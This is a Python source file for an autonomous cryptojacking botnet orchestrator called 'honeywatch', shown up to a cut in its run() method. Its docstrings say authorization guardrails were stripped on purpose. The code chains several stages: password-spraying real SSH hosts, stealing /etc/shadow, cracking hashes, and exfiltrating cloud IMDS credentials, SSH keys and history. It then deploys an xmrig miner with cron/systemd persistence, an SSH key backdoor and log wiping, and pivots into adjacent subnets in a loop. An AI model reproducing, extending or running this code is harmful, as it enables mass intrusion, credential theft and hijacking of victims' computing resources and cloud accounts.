"""Autonomous cryptojacker chain orchestrator for honeywatch.

This is the kill-chain engine that turns honeywatch from a tool collection
into a self-running botnet. It ports NetAttackAI's phase + capability model
but drops the authorized-testing guardrails: no scope gate, no read-only
default, business-hours + source-rotation opsec baked in, and it loops on
*growth* -- every pivot that surfaces new hosts feeds back into enumeration.

The chain (each phase consumes artifacts the previous phase produced, kept in
the shared SQLite store so a killed run resumes from what's already known):

    recon        scan + score real SSH hosts              -> hosts
    enumerate    auth-method precheck on real hosts       -> sprayable hosts
    spray        lockout-safe password spray              -> credentials
    foothold     verify a cred by grabbing /etc/shadow    -> footholds
    escalate     offline hashcrack of grabbed shadows     -> more credentials
    persist      deploy xmrig via cracked passwords       -> deployed fleet
    pivot        discover adjacent subnets from footholds  -> new hosts -> loop

State lives in :class:`ChainState`; the store is the durable backing. The
orchestrator never raises -- a phase that fails records its error and the
chain continues to the next phase (a dead scanner should not kill a foothold
you already have).
"""

from __future__ import annotations

import asyncio
import ipaddress
import os
import socket
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable

from honeywatch.opsec import ProxyPool, spoofed_ssh_banner

__all__ = [
    "ChainConfig",
    "ChainPhase",
    "ChainState",
    "ChainOrchestrator",
    "run_chain",
]


class ChainPhase(str, Enum):
    ROUND = "round"   # meta: round delimiter, not a network phase
    RECON = "recon"
    ENUMERATE = "enumerate"
    SPRAY = "spray"
    FOOTHOLD = "foothold"
    ESCALATE = "escalate"
    LOOT = "loot"        # credential + cloud metadata exfil from footholds
    PERSIST = "persist"
    PIVOT = "pivot"


@dataclass
class ChainConfig:
    """Operator inputs that drive one autonomous run."""

    # Targets for the recon phase (CIDRs / IPs). If empty, recon is skipped and
    # the chain works off whatever the store already holds (resume / pivot-only).
    targets: list[str] = field(default_factory=list)
    scan_tool: str = "masscan"
    scan_rate: int | None = None
    max_hosts: int | None = None

    # Spray population.
    users: list[str] = field(default_factory=list)
    user_file: str | None = None
    passwords: list[str] = field(default_factory=list)
    password_file: str | None = None
    # Deploy payload (cryptojacker). The chain only *enqueues* operations; a
    # separately-launched `honeywatch worker` picks up the tasks and executes
    # them, so the worker's --exec-mode (not the chain's) governs how a deploy
    # actually runs.
    payload_id: str = "xmrig"
    pool: str = ""
    wallet: str = ""
    worker: str = "honeywatch"
    threads: int = 0
    tls: bool = False
    evasion: list[str] = field(default_factory=list)

    # Offline hash cracking.
    hashcrack_wordlist: str = ""  # empty = use bundled default
    hashcrack_tool: str = "hashcat"

    # Opsec knobs (threaded into every network-touching phase).
    business_hours: bool = False
    proxy_file: str | None = None
    jump_file: str | None = None
    delay: float = 0.0
    jitter: float = 0.5
    lockout_delay: float = 0.0
    host_concurrency: int = 8
    min_confidence: float = 0.7
    target_labels: set[str] = field(default_factory=lambda: {"real", "likely_real"})

    # Loop control.
    max_rounds: int = 3
    skip_vpn_check: bool = False

    # Operator's SSH public key — installed into every foothold's
    # authorized_keys so access survives a password change. This is the
    # persistence primitive real cryptojackers use to keep access after the
    # victim rotates creds. Empty = skip the SSH key backdoor payload.
    backdoor_key: str = ""

    # Operator config TOML, threaded into recon's load_config so scan tuning
    # from config.toml (ports, AI, scanner opts) is honored through the chain,
    # not just via `honeywatch scan`. None = env / ./config.toml / defaults.
    config_path: str | None = None

    # Run id for durable resume state (chain_state table). Defaults to a
    # per-process stamp when unset; pass an explicit id to resume a previous
    # run across process restarts.
    run_id: str = ""

    # Where recovered shadows land + where pivots read from.
    db_path: str = "honeywatch.db"
    shadow_stash: str = ".honeywatch/shadow_stash"


@dataclass
class ChainState:
    """Live state threaded across phases; the store is the durable backing."""

    round: int = 0
    hosts: list[tuple[str, int]] = field(default_factory=list)        # discovered
    sprayable: list[tuple[str, int]] = field(default_factory=list)    # password-auth
    credentials: list[dict] = field(default_factory=list)             # recovered
    footholds: list[tuple[str, int, str, str]] = field(default_factory=list)  # ip,port,user,pass
    # Targets with a deploy task queued in the C2 store this run. The chain
    # cannot know synchronous deploy outcome -- that is the worker's job -- so
    # this is honestly "enqueued", not "deployed".
    enqueued: list[tuple[str, int]] = field(default_factory=list)
    # Every subnet the chain has pivoted into across all rounds (accumulates).
    pivoted_subnets: list[str] = field(default_factory=list)
    # Loot harvested from footholds: {ip: LootResult.summary()} so the run
    # summary reflects what was exfiltrated each round.
    loot: list[dict] = field(default_factory=list)
    # Cloud credentials recovered via IMDS (highest-value loot — these can
    # spawn fresh infrastructure to mine on).
    cloud_creds: list[dict] = field(default_factory=list)
    # SSH private keys recovered from footholds (re-used across the fleet
    # for key-based pivoting the spray phase can't reach).
    recovered_ssh_keys: list[str] = field(default_factory=list)
    # Footholds that already had their loot harvested this run (so we don't
    # re-SFTP the same files every round).
    looted_footholds: list[tuple[str, int]] = field(default_factory=list)
    log: list[dict] = field(default_factory=list)
    stopped: bool = False
    stop_reason: str = ""

    def note(self, phase: ChainPhase, msg: str, **extra) -> None:
        self.log.append({"phase": phase.value, "msg": msg, "round": self.round, **extra})


# --------------------------------------------------------------------------- #
# Small SSH exec helper (used by foothold verification + pivot discovery)
# --------------------------------------------------------------------------- #


def _ssh_exec(
    ip: str, port: int, user: str, password: str | None, key_path: str | None,
    command: str, timeout_s: float = 15.0,
) -> tuple[int | None, str, str | None]:
    """Run one command on a host via paramiko. Returns (rc, stdout, error)."""
    try:
        import paramiko  # type: ignore[import-not-found]
    except Exception as exc:
        return None, "", f"paramiko unavailable: {exc!r}"
    transport = None
    try:
        # Build the socket with an explicit connect timeout so a host that
        # blackholes the SYN (rather than refusing) cannot hold the foothold/
        # pivot phase indefinitely. paramiko.Transport((ip, port)) connects
        # with no timeout of its own.
        import socket as _socket

        sock = _socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        transport = paramiko.Transport(sock)
        banner = spoofed_ssh_banner()
        transport._CLIENT_IDENTITY = banner
        transport.local_version = banner
        # set_timeout governs the banner exchange + auth window so a host that
        # accepts the TCP connect but never finishes the SSH handshake cannot
        # hang the foothold/pivot phase indefinitely.
        transport.set_timeout(timeout_s)
        transport.start_client(timeout=timeout_s)
        if key_path:
            pkey = paramiko.RSAKey.from_private_key_file(key_path)
            transport.auth_publickey(user, pkey)
        else:
            transport.auth_password(user, password or "")
        chan = transport.open_session()
        chan.settimeout(timeout_s)
        chan.exec_command(command)
        out = b""
        err = b""
        # Drain BOTH stdout and stderr until the channel closes. Reading only
        # stdout deadlocks a command that writes more than the pipe buffer to
        # stderr: the remote process blocks on a full stderr buffer while we sit
        # waiting on a stdout stream that never grows. Poll both streams against
        # an overall deadline so a hung command is cut off rather than looping.
        deadline = time.monotonic() + timeout_s
        while True:
            got = False
            if chan.recv_ready():
                out += chan.recv(4096)
                got = True
            if chan.recv_stderr_ready():
                err += chan.recv_stderr(4096)
                got = True
            if (chan.exit_status_ready()
                    and not chan.recv_ready()
                    and not chan.recv_stderr_ready()):
                break
            if not got:
                if time.monotonic() > deadline:
                    break
                time.sleep(0.01)
        rc = chan.recv_exit_status()
        text = out.decode("utf-8", "replace")
        if err:
            text += "\n[stderr]\n" + err.decode("utf-8", "replace")
        return rc, text, None
    except Exception as exc:
        return None, "", f"{type(exc).__name__}: {exc}"
    finally:
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass


def _adjacent_subnets(interfaces_text: str) -> list[str]:
    """Parse `ip -o -4 addr` (or `ifconfig`) output into /24s the host sits on.

    The pivot command is ``ip -o -4 addr || ifconfig``, so this must handle both
    shapes: modern ``ip`` (``inet 10.0.0.5/24 ...``) and the two ``ifconfig``
    forms — new (``inet 10.0.0.5 netmask ...``) and legacy net-tools
    (``inet addr:10.0.0.5  Bcast:...  Mask:...``).
    """
    nets: list[str] = []
    for line in interfaces_text.splitlines():
        # format: "2: eth0    inet 10.0.0.5/24 brd ... scope global eth0"
        if " inet " not in line:
            continue
        try:
            inet_part = line.split(" inet ", 1)[1].split()[0]
            # Legacy ifconfig: "inet addr:10.0.0.5" -> first token is "addr:10.0.0.5".
            if inet_part.startswith("addr:"):
                inet_part = inet_part[len("addr:"):]
            ip_cidr = inet_part.split("/")[0]
        except (IndexError, ValueError):
            continue
        if ip_cidr.startswith(("127.", "169.254.")):
            continue
        # Pivot on a /24 chunk of the host's address only -- scanning a whole
        # /16 or /8 from a foothold is far too loud. Keeps pivots tight. Emit
        # the canonical network base (10.0.0.0/24), not the host IP, so recon
        # targets read clean and de-dup is exact across rounds.
        try:
            net = ipaddress.ip_network(f"{ip_cidr}/24", strict=False)
        except ValueError:
            continue
        nets.append(str(net))
    # de-dup, keep order
    seen: set[str] = set()
    out: list[str] = []
    for n in nets:
        if n not in seen:
            seen.add(n)
            out.append(n)
    return out


# --------------------------------------------------------------------------- #
# Orchestrator
# --------------------------------------------------------------------------- #


class ChainOrchestrator:
    """Runs the autonomous cryptojacker chain, looping on growth."""

    def __init__(self, config: ChainConfig, on_phase: Callable | None = None):
        self.cfg = config
        self.state = ChainState()
        self.on_phase = on_phase
        self.pool = ProxyPool.from_files(proxy_file=config.proxy_file,
                                         jump_file=config.jump_file)

    # -- helpers -----------------------------------------------------------
    def _emit(self, phase: ChainPhase, msg: str, **extra) -> None:
        self.state.note(phase, msg, **extra)
        if self.on_phase:
            try:
                self.on_phase(phase, msg, self.state, **extra)
            except Exception:
                pass

    def _require_vpn(self, skip: bool) -> None:
        """Enforce the Mullvad VPN gate for the whole chain.

        Every network phase (spray, foothold, loot, pivot) does raw SSH/SFTP/
        IMDS that would expose the operator's real IP without a tunnel. The
        recon scanner has its own internal gate, but the other phases don't —
        this gate at :meth:`run` entry covers them all. Raises :class:`VpnError`
        when Mullvad is down and ``skip_vpn_check`` is False.
        """
        from honeywatch.vpn import DEFAULT_TIMEOUT, VpnError, require_mullvad

        if skip or self.cfg.skip_vpn_check:
            return
        if not require_mullvad(timeout=DEFAULT_TIMEOUT, quiet=True):
            raise VpnError(
                "Mullvad VPN is not connected. The botnet chain runs raw "
                "SSH/SFTP/IMDS in every phase — connect Mullvad first, or pass "
                "--skip-vpn-check / set skip_vpn_check=True for controlled "
                "offline testing."
            )

    def _store(self):
        from honeywatch.store import Store
        return Store(self.cfg.db_path)

    @property
    def _sem(self) -> asyncio.Semaphore:
        """Per-loop concurrency semaphore (host_concurrency).

        A semaphore binds to the event loop that first uses it. Phases may be
        driven from different loops (the engine's own loop, a test's
        ``asyncio.run``, the agent's worker thread), so we recreate it per
        loop instead of caching one across loops.
        """
        loop = asyncio.get_running_loop()
        cached = self.__dict__.get("_sem_cache")
        if cached is not None and getattr(cached, "_loop", None) is loop:
            return cached
        sem = asyncio.Semaphore(max(1, self.cfg.host_concurrency))
        self.__dict__["_sem_cache"] = sem
        return sem

    # -- phases ------------------------------------------------------------
    async def phase_recon(self) -> None:
        self._emit(ChainPhase.RECON, f"scanning {len(self.cfg.targets)} target(s)")
        if not self.cfg.targets:
            self._emit(ChainPhase.RECON, "no targets; working off stored hosts")
            return
        from honeywatch.config import load_config
        from honeywatch.pipeline import Pipeline

        cfg = load_config(self.cfg.config_path)
        store = self._store()
        pipeline = Pipeline(cfg, store=store)
        try:
            scores = await pipeline.scan(
                targets=list(self.cfg.targets),
                tool=self.cfg.scan_tool,
                rate=self.cfg.scan_rate or 1000,
                max_hosts=self.cfg.max_hosts,
                skip_vpn_check=self.cfg.skip_vpn_check,
            )
            self._emit(ChainPhase.RECON, f"scored {len(scores)} hosts")
        except Exception as exc:
            self._emit(ChainPhase.RECON, f"recon failed: {type(exc).__name__}: {exc}")

    async def phase_enumerate(self) -> None:
        store = self._store()
        # Label filtering pushed into SQL (uses idx_hosts_label) instead of
        # pulling up to 100k rows and filtering labels in Python — the old
        # pattern silently truncated at 100k and loaded every row into memory.
        rows = store.query(
            limit=1_000_000, min_confidence=self.cfg.min_confidence,
            labels=self.cfg.target_labels,
        )
        hosts = [(r["ip"], int(r["port"])) for r in rows]
        # de-dup
        seen: set = set()
        self.state.hosts = [h for h in hosts if not (h in seen or seen.add(h))]
        self._emit(ChainPhase.ENUMERATE, f"{len(self.state.hosts)} real/likely hosts")

        from honeywatch.opsec import auth_methods

        probe_user = self.cfg.users[0] if self.cfg.users else "root"
        # Concurrent auth-method precheck: serial probing is the bottleneck on
        # planet-scale host lists (every other network phase is already
        # concurrent). auth_methods never raises, so gather is safe. Bound the
        # fan-out with the shared chain semaphore (host_concurrency) so a
        # million-host enumerate doesn't try to hand a million threads to the
        # default executor at once.
        if self.state.hosts:
            sem = self._sem

            async def _one(ip: str, port: int):
                async with sem:
                    return await asyncio.to_thread(
                        auth_methods, ip, port, probe_user
                    )

            ams = await asyncio.gather(
                *(_one(ip, port) for ip, port in self.state.hosts)
            )
        else:
            ams = []
        sprayable: list[tuple[str, int]] = []
        for (ip, port), am in zip(self.state.hosts, ams):
            if am.offers_password:
                sprayable.append((ip, port))
            # unreachable hosts stay in `hosts` but aren't sprayable
        self.state.sprayable = sprayable
        self._emit(ChainPhase.ENUMERATE,
                   f"{len(sprayable)} hosts offer password auth "
                   f"({len(self.state.hosts) - len(sprayable)} skipped)")

    async def phase_spray(self) -> None:
        if not self.state.sprayable:
            self._emit(ChainPhase.SPRAY, "no sprayable hosts; skipping")
            return
        from honeywatch.spray import (
            SprayHost,
            SprayPlan,
            spray_plan,
        )
        from honeywatch.opsec import ProxyPool
        store = self._store()

        users = self.cfg.users or self._load_users()
        passwords = self.cfg.passwords or self._load_passwords() or \
            ["Summer2024!", "Winter2024!", "Changeme123", "Welcome1"]

        # Fleet growth (round >= 2): re-spray every recovered password across
        # the current sprayable set. Password reuse across a fleet is the
        # blackhat growth primitive -- a cred cracked on one box often opens
        # others. Mirrors `honeywatch spray --reuse-creds`.
        if self.state.round > 1:
            recovered = {c.get("password")
                         for c in store.query_credentials(limit=100000)
                         if c.get("password")}
            recovered -= set(passwords)
            if recovered:
                passwords = list(recovered) + list(passwords)
                self._emit(ChainPhase.SPRAY,
                           f"reuse-creds: {len(recovered)} recovered password(s) prepended")

        hosts = [SprayHost(ip=ip, port=port, users=list(users))
                 for ip, port in self.state.sprayable]
        pool = ProxyPool.from_files(proxy_file=self.cfg.proxy_file,
                                    jump_file=self.cfg.jump_file)
        all_creds: list[dict] = []
        for pw in passwords:
            self._emit(ChainPhase.SPRAY, f"round password={pw!r} against "
                       f"{len(hosts)} host(s)")
            plan = SprayPlan(
                password=pw,
                hosts=list(hosts),
                delay=self.cfg.delay,
                jitter=self.cfg.jitter,
                lockout_delay=self.cfg.lockout_delay,
                business_hours=self.cfg.business_hours,
            )
            res = await spray_plan(
                plan, pool=pool, host_concurrency=self.cfg.host_concurrency,
            )
            for r in res:
                if r.success:
                    cred = {"ip": r.ip, "port": r.port, "user": r.user,
                            "password": r.password}
                    all_creds.append(cred)
                    store.upsert_credential(
                        r.ip, r.port, r.user or "", r.password,
                        attempts=r.attempts, source="chain-spray")
        # Accumulate unique credentials across rounds.
        seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
        for c in all_creds:
            key = (c["ip"], c["port"], c["user"], c["password"])
            if key not in seen:
                self.state.credentials.append(c)
                seen.add(key)
        self._emit(ChainPhase.SPRAY, f"recovered {len(all_creds)} credential(s) this round "
                   f"({len(self.state.credentials)} total)")

    async def phase_foothold(self) -> None:
        """Verify each recovered cred by actually grabbing /etc/shadow.

        The per-cred SFTP grab is the slowest network op in the chain; the
        serial loop previously stalled a 1000-cred round for hours. Now the
        grabs fan out concurrently, bounded by the shared chain semaphore.
        """
        from honeywatch.hashcrack import grab_shadow

        creds = self._store().query_credentials(limit=100000)
        # Accumulate unique footholds across rounds (de-dup by ip,port,user) so
        # the chain summary reflects the whole run, not just the last round.
        existing = {(f[0], f[1], f[2]) for f in self.state.footholds}
        footholds: list[tuple[str, int, str, str]] = list(self.state.footholds)
        sem = self._sem

        async def _verify(c: dict) -> tuple[str, int, str, str] | None:
            ip, port, user, pw = c["ip"], int(c["port"]), c["user"], c.get("password")
            if not (user and pw):
                return None
            # Already confirmed in an earlier round -- never re-grab. Re-SFTPing
            # /etc/shadow from a box you already own is pure target-side noise.
            if (ip, port, user) in existing:
                return None
            async with sem:
                grab = await asyncio.to_thread(
                    grab_shadow, ip, port, user, pw,
                    stash_dir=self.cfg.shadow_stash,
                )
            if grab.get("shadow_path"):
                self._emit(ChainPhase.FOOTHOLD, f"foothold confirmed {ip}:{port} ({user})")
                return (ip, port, user, pw)
            if grab.get("error"):
                # auth worked for spray but not for shadow read (non-root); still
                # a usable shell even if /etc/shadow is denied.
                async with sem:
                    rc, out, err = await asyncio.to_thread(
                        _ssh_exec, ip, port, user, pw, None, "id"
                    )
                if rc == 0:
                    self._emit(ChainPhase.FOOTHOLD, f"foothold (shell only) {ip}:{port}")
                    return (ip, port, user, pw)
            return None

        results = await asyncio.gather(*(_verify(c) for c in creds))
        for r in results:
            if r is not None:
                footholds.append(r)
        self.state.footholds = footholds
        self._emit(ChainPhase.FOOTHOLD, f"{len(footholds)} foothold(s)")

    async def phase_escalate(self) -> None:
        """Offline-hashcrack every grabbed shadow -> more creds.

        Each per-foothold hashcat/john run is a blocking subprocess; the
        serial loop stalled large foothold sets. Runs fan out concurrently,
        bounded by the shared chain semaphore.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.ESCALATE, "skipping (no footholds)")
            return
        from honeywatch.crack import default_wordlist_path
        from honeywatch.hashcrack import crack_shadow

        wordlist = self.cfg.hashcrack_wordlist or default_wordlist_path()

        store = self._store()
        sem = self._sem

        async def _crack_one(f: tuple) -> list[dict]:
            ip, port, user, pw = f
            # Sanitize the IP for the stash path (path-traversal guard) —
            # grab_shadow/grab_loot do this, but phase_escalate was building
            # the path with a raw f-string. Lateral pivot hosts from
            # known_hosts/history can include hostnames, and a hostname
            # containing / or .. would traverse.
            safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
            stash = os.path.join(self.cfg.shadow_stash, safe_ip, "shadow")
            if not os.path.isfile(stash):
                return []
            async with sem:
                res = await asyncio.to_thread(
                    crack_shadow, stash, wordlist, self.cfg.hashcrack_tool,
                )
            return [
                {"ip": ip, "port": port, "user": c["user"],
                 "password": c["password"]}
                for c in res.credentials()
            ]

        results = await asyncio.gather(*(_crack_one(f) for f in self.state.footholds))
        new_creds = 0
        seen = {(c["ip"], c["port"], c["user"], c["password"])
                for c in self.state.credentials}
        for creds in results:
            for cred in creds:
                store.upsert_credential(
                    cred["ip"], cred["port"], cred["user"], cred["password"],
                    attempts=1, source="chain-hashcrack")
                new_creds += 1
                key = (cred["ip"], cred["port"], cred["user"], cred["password"])
                if key not in seen:
                    self.state.credentials.append(cred)
                    seen.add(key)
        self._emit(ChainPhase.ESCALATE, f"offline-cracked {new_creds} new credential(s) "
                   f"({len(self.state.credentials)} total)")

    async def phase_loot(self) -> None:
        """Exfil credentials, cloud metadata, and intel from every new foothold.

        This is the blackhat growth engine honeywatch was missing. Real
        cryptojacking botnets harvest AWS/GCP/Azure role creds via IMDS,
        SSH private keys, kubeconfig, docker creds, and shell history —
        not just /etc/shadow. Cloud creds let you spawn *fresh* EC2/GCP
        instances mining on the operator's bill (planet-scale growth that
        doesn't depend on finding another vulnerable SSH box).

        The per-foothold SFTP+IMDS grab is slow; the serial loop previously
        stalled a 1000-foothold round for hours. Now loots fan out
        concurrently, bounded by the shared chain semaphore.
        """
        from honeywatch.loot import grab_loot

        if not self.state.footholds:
            self._emit(ChainPhase.LOOT, "skipping (no footholds)")
            return
        already_looted = set(self.state.looted_footholds)
        sem = self._sem

        async def _loot_one(f: tuple) -> None:
            ip, port, user, pw = f
            key = (ip, port)
            if key in already_looted:
                return
            async with sem:
                res = await asyncio.to_thread(
                    grab_loot, ip=ip, port=port, user=user, password=pw,
                    stash_dir=self.cfg.shadow_stash,  # share the stash root
                )
            already_looted.add(key)
            self.state.looted_footholds.append(key)
            self.state.loot.append({"ip": ip, "port": port,
                                   "summary": res.summary(),
                                   "files": len(res.files),
                                   "ssh_keys": len(res.ssh_keys),
                                   "cloud_creds": len(res.cloud_creds),
                                   "pivot_targets": len(res.pivot_targets)})
            # Track recovered SSH private keys for key-based pivoting in later
            # rounds (the spray phase can't reach publickey-only hosts).
            for kp in res.ssh_keys:
                if kp not in self.state.recovered_ssh_keys:
                    self.state.recovered_ssh_keys.append(kp)
            # Track cloud creds (highest-value loot).
            if res.cloud_creds:
                self.state.cloud_creds.append({
                    "ip": ip, "port": port,
                    "creds": list(res.cloud_creds.keys()),
                    "metadata": {k: v for k, v in res.metadata.items()
                                 if k in ("aws_roles", "aws_instance_id",
                                          "gcp_token", "azure_instance")},
                })
            if res.error:
                self._emit(ChainPhase.LOOT,
                           f"{ip}:{port} loot failed: {res.error}")
            else:
                self._emit(ChainPhase.LOOT,
                           f"{ip}:{port} looted: {res.summary()}")

        targets = [(ip, port, user, pw) for ip, port, user, pw in self.state.footholds
                   if (ip, port) not in already_looted]
        before = len(self.state.looted_footholds)
        await asyncio.gather(*(_loot_one(f) for f in targets))
        new_count = len(self.state.looted_footholds) - before
        self._emit(ChainPhase.LOOT,
                   f"looted {new_count} new foothold(s) "
                   f"({len(self.state.recovered_ssh_keys)} ssh key(s), "
                   f"{len(self.state.cloud_creds)} cloud cred hit(s) total)")

    async def phase_persist(self) -> None:
        """Deploy the cryptojacker payload onto every foothold.

        Real cryptojacking botnets don't just drop xmrig — they chain three
        things onto the deploy: (1) kill any competing miner already running,
        (2) deploy the miner, (3) install persistence (systemd + cron) so a
        reboot doesn't lose the box, and (4) drop an SSH authorized_keys
        backdoor so access survives a password change. Without this a reboot
        or a single `pkill xmrig` reverts the whole foothold.

        CPU-only (manifest build + C2 enqueue, no network); async signature
        for the uniform phase contract but no blocking I/O.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.PERSIST, "no footholds; skipping deploy")
            return
        from honeywatch.c2.store import C2Store
        from honeywatch.models import Target
        from honeywatch.ops import build_manifest, enqueue_operation

        if self.cfg.payload_id in {"xmrig", "xmrigcc"}:
            missing = [k for k in ("pool", "wallet") if not getattr(self.cfg, k)]
            if missing:
                flags = ", ".join(f"--{k}" for k in missing)
                self._emit(
                    ChainPhase.PERSIST,
                    f"ABORT: miner deploy needs {flags} "
                    f"(configure via `honeywatch setup` or pass {flags})",
                )
                return

        targets: list[Target] = []
        for ip, port, user, pw in self.state.footholds:
            targets.append(Target(
                ip=ip, port=port, label="real", confidence=1.0,
                allowed_categories=["miner"], ssh_user=user, ssh_pass=pw,
            ))
        variables = {
            "pool": self.cfg.pool, "wallet": self.cfg.wallet,
            "worker": self.cfg.worker, "threads": str(self.cfg.threads),
            "tls": str(self.cfg.tls).lower(),
        }
        # Persistence evasion chain: kill competing miners first, then install
        # the miner, then install systemd + cron persistence + an SSH key
        # backdoor. This is the exact sequence every real cryptojacker runs.
        persistence_evasion = ["kill_miners"]
        if self.cfg.evasion:
            persistence_evasion.extend(self.cfg.evasion)
        # Always chain systemd + cron persistence so a reboot doesn't lose the
        # box (the operator can disable this via config, but the default is
        # "survive reboots" — anything less isn't a real botnet).
        if "systemd_persist" not in persistence_evasion:
            persistence_evasion.append("systemd_persist")
        if "cron_persist" not in persistence_evasion:
            persistence_evasion.append("cron_persist")
        if self.cfg.backdoor_key and "sshkey_backdoor" not in persistence_evasion:
            persistence_evasion.append("sshkey_backdoor")
            variables["backdoor_key"] = self.cfg.backdoor_key
        # cleanup runs LAST so the box carries no IR fingerprints tying it to
        # the deploy (history cleared, logs truncated, dropper removed). Real
        # cryptojacking crews do exactly this — without it the install log
        # at /tmp/honeywatch_*_install.log is a trivial tell.
        if "cleanup" not in persistence_evasion:
            persistence_evasion.append("cleanup")

        try:
            manifest = build_manifest(self.cfg.payload_id, targets, variables,
                                      apply_evasion=persistence_evasion)
            c2 = C2Store(self.cfg.db_path)
            op = enqueue_operation(c2, manifest)
            # The chain only enqueues; a separately-launched `honeywatch worker`
            # picks up the tasks and executes them (its own --exec-mode). Track
            # what we queued, not what has run -- we cannot know the latter
            # synchronously. Accumulate unique (ip, port) across rounds so the
            # run summary reflects everything queued, not just the last round.
            seen_q = set(self.state.enqueued)
            for t in targets:
                key = (t.ip, t.port)
                if key not in seen_q:
                    self.state.enqueued.append(key)
                    seen_q.add(key)
            self._emit(ChainPhase.PERSIST,
                       f"enqueued {op.id}: {len(targets)} deploy task(s) "
                       f"with evasion=[{','.join(persistence_evasion)}] "
                       f"(worker executes async)")
        except Exception as exc:
            self._emit(ChainPhase.PERSIST, f"deploy failed: {type(exc).__name__}: {exc}")

    async def phase_pivot(self) -> None:
        """Discover adjacent subnets + lateral pivot targets from each foothold.

        Two sources of new recon targets, mirroring what every real
        cryptojacker pulls:
          1. ``ip -o -4 addr`` on the foothold -> adjacent /24 subnets to scan.
          2. Loot harvested in ``phase_loot`` -> known_hosts, ssh config jump
             hosts, and internal hosts from shell history. These are often a
             richer pivot source than the network graph: ~/.ssh/known_hosts
             lists every box the victim already SSH'd into.

        The per-foothold SSH probe runs concurrently (bounded by the shared
        chain semaphore) instead of serially.
        """
        if not self.state.footholds:
            self._emit(ChainPhase.PIVOT, "no footholds to pivot from")
            return
        sem = self._sem

        async def _probe(f: tuple) -> list[str]:
            ip, port, user, pw = f
            async with sem:
                rc, out, err = await asyncio.to_thread(
                    _ssh_exec, ip, port, user, pw, None,
                    "ip -o -4 addr 2>/dev/null || ifconfig 2>/dev/null",
                )
            if rc == 0 and out:
                nets = _adjacent_subnets(out)
                if nets:
                    self._emit(ChainPhase.PIVOT, f"{ip} sits on {', '.join(nets)}")
                return nets
            return []

        probe_results = await asyncio.gather(
            *(_probe(f) for f in self.state.footholds)
        )
        new_nets: list[str] = []
        for nets in probe_results:
            new_nets.extend(nets)
        lateral_hosts: list[str] = []
        # Pull lateral pivot targets from the loot stash (known_hosts,
        # ssh_config, history) that phase_loot already exfiltrated. These
        # survive across rounds because loot accumulates.
        loot_root = self.cfg.shadow_stash
        for loot_entry in self.state.loot:
            # Re-read the exfiltrated known_hosts/ssh_config/history from the
            # stash. The stash lives at <shadow_stash>/<ip>/loot/.
            ip = loot_entry["ip"]
            ip_dir = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
            loot_dir = os.path.join(loot_root, ip_dir, "loot")
            for fname in ("ssh_known_hosts", "ssh_config", "bash_history",
                          "zsh_history", "etc_hosts"):
                fpath = os.path.join(loot_dir, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
                        text = fh.read()
                except OSError:
                    continue
                from honeywatch.loot import (
                    parse_known_hosts, parse_ssh_config, parse_history_for_targets,
                )
                if fname == "ssh_known_hosts":
                    for h in parse_known_hosts(text):
                        lateral_hosts.append(h.host)
                elif fname == "ssh_config":
                    for b in parse_ssh_config(text):
                        h = b.get("hostname") or b.get("host", "")
                        if h and h != "*":
                            lateral_hosts.append(h)
                elif fname in ("bash_history", "zsh_history"):
                    hosts, _p = parse_history_for_targets(text)
                    lateral_hosts.extend(hosts)
                elif fname == "etc_hosts":
                    for line in text.splitlines():
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        parts = line.split()
                        if len(parts) >= 2:
                            for alias in parts[1:]:
                                if alias not in ("localhost",):
                                    lateral_hosts.append(alias)

        # de-dup this round's nets, excluding anything already pivoted into in
        # a prior round so we never re-scan a subnet we've already touched.
        seen: set = set(self.state.pivoted_subnets)
        unique_nets = [n for n in new_nets if not (n in seen or seen.add(n))]
        # Accumulate every subnet the chain has pivoted into across all rounds.
        self.state.pivoted_subnets = list(self.state.pivoted_subnets) + unique_nets
        # De-dup lateral hosts (IPs or hostnames from known_hosts/history).
        # Convert hostnames to CIDRs where possible; otherwise treat as
        # explicit host targets. We resolve hostnames later in recon via the
        # scanner's target list (it accepts IPs/CIDRs/hostnames).
        unique_lateral: list[str] = []
        seen_l: set[str] = set(self.state.pivoted_subnets)
        for h in lateral_hosts:
            if h in seen_l:
                continue
            seen_l.add(h)
            # Try to convert a bare IP into its /24 so recon sweeps the
            # neighbour block; hostnames stay as-is (recon resolves them).
            try:
                import ipaddress
                net = ipaddress.ip_network(f"{h}/24", strict=False)
                unique_lateral.append(str(net))
            except ValueError:
                unique_lateral.append(h)
        # Convert discovered /24s + lateral hosts into the next recon target list.
        self.cfg.targets = unique_nets + unique_lateral
        self._emit(ChainPhase.PIVOT,
                   f"{len(unique_nets)} new subnet(s) + {len(unique_lateral)} "
                   f"lateral host(s) queued for recon "
                   f"({len(self.state.pivoted_subnets)} total pivoted)")

    # -- loaders -----------------------------------------------------------
    def _load_users(self) -> list[str]:
        from honeywatch.crack import default_users
        users = list(self.cfg.users)
        if self.cfg.user_file:
            try:
                with open(self.cfg.user_file, "r", encoding="utf-8") as fh:
                    users += [u.strip() for u in fh if u.strip() and not u.startswith("#")]
            except OSError:
                pass
        return users or default_users()

    def _load_passwords(self) -> list[str]:
        passwords = list(self.cfg.passwords)
        if self.cfg.password_file:
            try:
                with open(self.cfg.password_file, "r", encoding="utf-8") as fh:
                    passwords += [p.strip() for p in fh if p.strip() and not p.startswith("#")]
            except OSError:
                pass
        return passwords

    # -- loop --------------------------------------------------------------
    def run(self) -> ChainState:
        """Run the full chain, pivoting up to max_rounds.

        ``max_rounds=0`` runs forever (a true unattended daemon) until growth
        exhausts -- a pivot round that finds no new subnets. ``max_rounds=N``
        caps it at N rounds.

        Safe from any context: when no event loop is running (CLI path) the
        async engine is driven with ``asyncio.run``; when called inside a
        running loop (the agent's ``run_chain`` tool, a notebook, another
        async caller) the engine runs in a worker thread so the loop is never
        nested — this kills the old ``RuntimeError: asyncio.run() cannot be
        called from a running event loop`` collision.
        """
        try:
            asyncio.get_running_loop()
        except RuntimeError:
            # No running loop: safe to drive the engine directly.
            return asyncio.run(self._run_async())
